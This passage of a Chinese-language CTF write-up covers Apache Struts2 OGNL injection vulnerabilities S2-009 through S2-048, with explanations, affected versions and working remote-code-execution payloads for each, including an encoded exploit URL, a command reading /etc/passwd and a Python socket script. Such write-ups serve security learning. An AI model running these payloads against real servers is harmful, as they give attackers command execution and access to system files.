class="string">&#x27;@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)&#x27;</span>)(<span class="number">1</span>)(<span class="number">2</span>)=Twings;</span><br></pre></td></tr></table></figure><p>没测试成功。</p><p><strong>姿势2</strong></p><p>开启了调试模式，但是调试模式中存在 OGNL 表达式注入漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%<span class="number">22</span>%<span class="number">5D</span>%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%<span class="number">28</span>%22false%<span class="number">22</span>%<span class="number">29</span>%<span class="number">20</span>%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>%<span class="number">5D</span>%<span class="number">3D</span>%23foo%2C<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString</span>%<span class="number">28</span><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>%<span class="number">28</span>%<span class="number">29.</span>exec%<span class="number">28</span>%27env%<span class="number">27</span>%<span class="number">29.</span>getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>)</span><br></pre></td></tr></table></figure><p>想要修改啥，还是把env换掉就行。</p><p>这题也是可以利用工具进行求解</p><h2 id="web283-S2-009"><a href="#web283-S2-009" class="headerlink" title="web283-S2-009"></a>web283-S2-009</h2><p>题目</p><p>提示：<strong>Struts2 showcase远程代码执行漏洞</strong></p><p>测试环境是一个struts2的“功能展示”网站<code>Struts Showcase</code>，代码很多，我们的目标是去找一个接受了参数，参数类型是string的action</p><p><img src="../images/image-20230222114920873.png" alt="image-20230222114920873"></p><p><code>url/S2-009/ajax/example5.action</code>即可访问控制器</p><p><img src="../images/image-20230222115312683.png" alt="image-20230222115312683"></p><p>写入payload后，会自动下载一个example.action文件，然后打开</p><p><img src="../images/image-20230222115455895.png" alt="image-20230222115455895"></p><p>那么我们就只需要修改payload里的<strong>whoami</strong>换成<strong>env</strong>就能拿到flag了</p><p>这里的话也可以使用工具</p><p>但是工具只能查出是哪个漏洞，但是这个工具不支持漏洞利用</p><h2 id="web284-S2-012"><a href="#web284-S2-012" class="headerlink" title="web284-S2-012"></a>web284-S2-012</h2><p>题目</p><p><img src="../images/image-20230222203744432.png" alt="image-20230222203744432"></p><p>由题目可知这是个编号为S2-012的漏洞</p><p><strong>漏洞原理</strong></p><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">package</span> name=<span class="string">&quot;S2-012&quot;</span> extends=<span class="string">&quot;struts-default&quot;</span>&gt;</span><br><span class="line">    &lt;action name=<span class="string">&quot;user&quot;</span> class=<span class="string">&quot;com.demo.action.UserAction&quot;</span>&gt;</span><br><span class="line">        &lt;result name=<span class="string">&quot;redirect&quot;</span> type=<span class="string">&quot;redirect&quot;</span>&gt;/index.jsp?name=$&#123;name&#125;&lt;/result&gt;</span><br><span class="line">        &lt;result name=<span class="string">&quot;input&quot;</span>&gt;/index.jsp&lt;/result&gt;</span><br><span class="line">        &lt;result name=<span class="string">&quot;success&quot;</span>&gt;/index.jsp&lt;/result&gt;</span><br><span class="line">    &lt;/action&gt;</span><br><span class="line">&lt;/<span class="keyword">package</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行</p><p>影响版本: 2.1.0 - 2.3.13</p><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;/etc/passwd&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230222204310623.png" alt="image-20230222204310623"></p><p>执行后会下载一个文件，然后只需要修改一下执行命令(env)就可以拿到flag了。</p><h2 id="web285-S2-013"><a href="#web285-S2-013" class="headerlink" title="web285-S2-013"></a>web285-S2-013</h2><p>题目</p><p><img src="../images/image-20230222204630266.png" alt="image-20230222204630266"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：</span><br><span class="line"></span><br><span class="line">none - 链接不包含请求的任意参数值（默认）</span><br><span class="line">get - 链接只包含 GET 请求中的参数和其值</span><br><span class="line">all - 链接包含 GET 和 POST 所有参数和其值</span><br><span class="line">&lt;s:a&gt;用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="literal">true</span>,#a=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&#x27;id&#x27;</span>).getInputStream(),#b=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#a),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#b),#d=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#c.read(#d),#out=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getWriter(),#out.println(#d),#out.close())&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"></span><br><span class="line">$&#123;#_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="literal">true</span>,<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>S2-014 是对 S2-013 修复的加强，在 S2-013 修复的代码中忽略了 ${ognl_exp} OGNL 表达式执行的方式，因此 S2-014 是对其的补丁加强</p><p>这里的话还是env   但是得把poc进行url全编码</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4e4c3c86-4fbd-4809-8809-8fffe7c3461d.challenge.ctf.show/S2-013/link.action?a=%24%7B%28%23%5F%6D%65%6D%62%65%72%41%63%63%65%73%73%5B%22%61%6C%6C%6F%77%53%74%61%74%69%63%4D%65%74%68%6F%64%41%63%63%65%73%73%22%5D%3D%74%72%75%65%2C%23%61%3D%40%6A%61%76%61%2E%6C%61%6E%67%2E%52%75%6E%74%69%6D%65%40%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%27%65%6E%76%27%29%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29%2C%23%62%3D%6E%65%77%20%6A%61%76%61%2E%69%6F%2E%49%6E%70%75%74%53%74%72%65%61%6D%52%65%61%64%65%72%28%23%61%29%2C%23%63%3D%6E%65%77%20%6A%61%76%61%2E%69%6F%2E%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%62%29%2C%23%64%3D%6E%65%77%20%63%68%61%72%5B%35%30%30%30%30%5D%2C%23%63%2E%72%65%61%64%28%23%64%29%2C%23%6F%75%74%3D%40%6F%72%67%2E%61%70%61%63%68%65%2E%73%74%72%75%74%73%32%2E%53%65%72%76%6C%65%74%41%63%74%69%6F%6E%43%6F%6E%74%65%78%74%40%67%65%74%52%65%73%70%6F%6E%73%65%28%29%2E%67%65%74%57%72%69%74%65%72%28%29%2C%23%6F%75%74%2E%70%72%69%6E%74%6C%6E%28%23%64%29%2C%23%6F%75%74%2E%63%6C%6F%73%65%28%29%29%7D</span><br></pre></td></tr></table></figure><h2 id="web286-S2-015"><a href="#web286-S2-015" class="headerlink" title="web286-S2-015"></a>web286-S2-015</h2><p>题目</p><p><strong>漏洞原理</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：</span><br><span class="line">&lt;<span class="keyword">package</span> name=<span class="string">&quot;S2-015&quot;</span> extends=<span class="string">&quot;struts-default&quot;</span>&gt;</span><br><span class="line">    &lt;action name=<span class="string">&quot;*&quot;</span> class=<span class="string">&quot;com.demo.action.PageAction&quot;</span>&gt;</span><br><span class="line">        &lt;result&gt;/&#123;<span class="number">1</span>&#125;.jsp&lt;/result&gt;</span><br><span class="line">    &lt;/action&gt;</span><br><span class="line">&lt;/<span class="keyword">package</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / “ \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功</p><p>还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 #_memberAccess[‘allowStaticMethodAccess’]=true 来修改其值达到重获静态方法调用的能力</p><p>影响版本: 2.0.0 - 2.3.14.2</p><p><strong>测试漏洞</strong></p><p><img src="../images/image-20230222210606236.png" alt="image-20230222210606236"></p><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#context[<span class="string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]=<span class="literal">false</span>,#m=#_memberAccess.getClass().getDeclaredField(<span class="string">&#x27;allowStaticMethodAccess&#x27;</span>),#m.setAccessible(<span class="literal">true</span>),#m.set(#_memberAccess,<span class="literal">true</span>),#q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>,#q&#125;.action</span><br></pre></td></tr></table></figure><p>得要url全编码并且将id改为env</p><h2 id="web287-S2-016"><a href="#web287-S2-016" class="headerlink" title="web287-S2-016"></a>web287-S2-016</h2><p>题目</p><p><img src="../images/image-20230223200203561.png" alt="image-20230223200203561"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在struts2中，DefaultActionMapper类支持以&quot;action:&quot;、“redirect:”、&quot;redirectAction:&quot;作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令</span><br><span class="line"></span><br><span class="line">所以，访问http://your-ip:8080/default.action?redirect:OGNL表达式即可执行OGNL表达式</span><br><span class="line"></span><br><span class="line">影响版本: 2.0.0 - 2.3.15</span><br></pre></td></tr></table></figure><p>poc</p><p><strong>执行命令</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:%<span class="number">24</span>%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>%<span class="number">5D</span>%3Dfalse%2C%<span class="number">23f</span>%<span class="number">3D</span>%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%<span class="number">22</span>)%2C%<span class="number">23f</span>.setAccessible(<span class="literal">true</span>)%2C%<span class="number">23f</span>.set(%23_memberAccess%2Ctrue)%2C%23a%<span class="number">3D</span>%40java.lang.Runtime%40getRuntime().exec(%22env%<span class="number">22</span>).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%<span class="number">23d</span>%3Dnew%20char%5B5000%<span class="number">5D</span>%2C%23c.read(%<span class="number">23d</span>)%2C%23genxor%<span class="number">3D</span>%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%<span class="number">22</span>).getWriter()%2C%23genxor.println(%<span class="number">23d</span>)%2C%23genxor.flush()%2C%23genxor.close()%<span class="number">7D</span></span><br></pre></td></tr></table></figure><h2 id="web288-S2-019"><a href="#web288-S2-019" class="headerlink" title="web288-S2-019"></a>web288-S2-019</h2><p>题目</p><p><img src="../images/image-20230223201046125.png" alt="image-20230223201046125"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">动态方法调用的默认启用，原理类似于s2-008</span><br><span class="line"></span><br><span class="line">Apache Struts 2的“Dynamic Method Invocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，这样就存在远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="string">&#x27;id&#x27;</span>)).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#out=#context.get(<span class="string">&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;</span>),#out.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()</span><br><span class="line"><span class="comment">// 利用是先进行url编码    </span></span><br></pre></td></tr></table></figure><p>与s2-008poc区别不同的仅仅是由原先的[“allowStaticMethodAccess”]=true静态方法执行改为(new java.lang.ProcessBuilder(‘id’)).start()，但该方法在虚空浪子心提出s2-012后不久就在博客里说明了官方修补方案将allowStaticMethodAccess取消了后的替补方法就是使用ava.lang.ProcessBuilder</p><p>影响版本：Struts 2.0.0 - Struts 2.3.15.1</p><p>这里的话和<strong>web286</strong>一样，得进行shell反弹，现在还不会，先留着。</p><h2 id="web289-S2-029"><a href="#web289-S2-029" class="headerlink" title="web289-S2-029"></a>web289-S2-029</h2><p>题目</p><p><img src="../images/image-20230223213512376.png" alt="image-20230223213512376"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Struts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估</span><br><span class="line"></span><br><span class="line">例如：代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%&#123;&#125;”。最终造成二次执行</span><br><span class="line"></span><br><span class="line">影响版本：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">default</span>.action?message=(%23_memberAccess[<span class="string">&#x27;allowPrivateAccess&#x27;</span>]=<span class="literal">true</span>,%23_memberAccess[<span class="string">&#x27;allowProtectedAccess&#x27;</span>]=<span class="literal">true</span>,%23_memberAccess[<span class="string">&#x27;excludedPackageNamePatterns&#x27;</span>]=%23_memberAccess[<span class="string">&#x27;acceptProperties&#x27;</span>],%23_memberAccess[<span class="string">&#x27;excludedClasses&#x27;</span>]=%23_memberAccess[<span class="string">&#x27;acceptProperties&#x27;</span>],%23_memberAccess[<span class="string">&#x27;allowPackageProtectedAccess&#x27;</span>]=<span class="literal">true</span>,%23_memberAccess[<span class="string">&#x27;allowStaticMethodAccess&#x27;</span>]=<span class="literal">true</span>,<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>)</span><br></pre></td></tr></table></figure><p>这题也要弹shell</p><h2 id="web290-S2-032"><a href="#web290-S2-032" class="headerlink" title="web290-S2-032"></a>web290-S2-032</h2><p>题目</p><p><img src="../images/image-20230223214103082.png" alt="image-20230223214103082"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用method:&lt;name&gt;的方式来调用名字是&lt;name&gt;的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞</span><br><span class="line"></span><br><span class="line">影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:%23_memberAccess%<span class="number">3d</span><span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>,%23res%<span class="number">3d</span>%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%<span class="number">5D</span>),%23w%<span class="number">3d</span>%23res.getWriter(),%23s%3dnew+java.util.Scanner(<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(%23parameters.cmd%5B0%<span class="number">5D</span>).getInputStream()).useDelimiter(%23parameters.pp%5B0%<span class="number">5D</span>),%23str%<span class="number">3d</span>%23s.hasNext()%<span class="number">3f</span>%23s.next()%3a%23parameters.ppp%5B0%<span class="number">5D</span>,%23w.print(%23str),%23w.close(),<span class="number">1</span>?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%<span class="number">20</span>&amp;encoding=UTF-<span class="number">8</span>&amp;cmd=id</span><br></pre></td></tr></table></figure><h2 id="web291-S2-033"><a href="#web291-S2-033" class="headerlink" title="web291-S2-033"></a>web291-S2-033</h2><p>题目</p><p><img src="../images/image-20230223214556408.png" alt="image-20230223214556408"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行</span><br><span class="line"></span><br><span class="line">影响版本：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/orders/<span class="number">4</span>/%23_memberAccess%<span class="number">3d</span><span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>,%23xx%3d123,%23rs%<span class="number">3d</span><span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream())</span>,%23wr%<span class="number">3d</span>%23context[%23parameters.obj[<span class="number">0</span>]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=<span class="number">2908</span>&amp;command=id</span><br></pre></td></tr></table></figure><h2 id="web292-S2-037"><a href="#web292-S2-037" class="headerlink" title="web292-S2-037"></a>web292-S2-037</h2><p>题目</p><p><img src="../images/image-20230223214824621.png" alt="image-20230223214824621"></p><p>漏洞原理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式</span><br><span class="line"></span><br><span class="line">影响版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/orders/<span class="number">3</span>/%23_memberAccess%<span class="number">3d</span><span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>,%23xx%3d123,%23rs%<span class="number">3d</span><span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream())</span>,%23wr%<span class="number">3d</span>%23context[%23parameters.obj[<span class="number">0</span>]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=<span class="number">2908</span>&amp;command=whoami</span><br></pre></td></tr></table></figure><h2 id="web293-S2-045"><a href="#web293-S2-045" class="headerlink" title="web293-S2-045"></a>web293-S2-045</h2><p>题目</p><p><img src="../images/image-20230223220621960.png" alt="image-20230223220621960"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵</span><br><span class="line">恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令</span><br><span class="line"></span><br><span class="line">影响版本：Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: <span class="string">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;whoami&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span> boundary=----WebKitFormBoundaryXx80aU0pu6vrsV3z</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还是得需要反弹shell</p><h2 id="web294-S2-046"><a href="#web294-S2-046" class="headerlink" title="web294-S2-046"></a>web294-S2-046</h2><p>题目</p><p><img src="../images/image-20230223221152582.png" alt="image-20230223221152582"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">与s2-045类似，但是输入点在文件上传的filename值位置，并需要使用\x00截断</span><br><span class="line"></span><br><span class="line">影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</span><br></pre></td></tr></table></figure><p>由于需要发送畸形数据包，简单使用原生socket编写payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">q = <span class="string">b&#x27;&#x27;&#x27;------WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;X-Test&#x27;,233*233)&#125;\x00b&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foo</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryXd004BVJN9pBYBL2--&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>)</span><br><span class="line">p = <span class="string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8080</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: en-US,en;q=0.8,es;q=0.6</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Length: %d</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>) % (<span class="built_in">len</span>(q), )</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.create_connection((<span class="string">&#x27;your-ip&#x27;</span>, <span class="string">&#x27;8080&#x27;</span>), timeout=<span class="number">5</span>) <span class="keyword">as</span> conn:</span><br><span class="line">    conn.send(p + q)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">10240</span>).decode())</span><br></pre></td></tr></table></figure><h2 id="web295-S2-048"><a href="#web295-S2-048" class="headerlink" title="web295-S2-048"></a>web295-S2-048</h2><p>题目</p><p><img src="../images/image-20230223224111641.png" alt="image-20230223224111641"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用</span><br><span class="line">而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同时这个 getText() 的 参数输入点，又可以被用户直接进行控制，如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击</span><br><span class="line"></span><br><span class="line">影响版本: 2.0.0 - 2.3.32</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230223224214133.png" 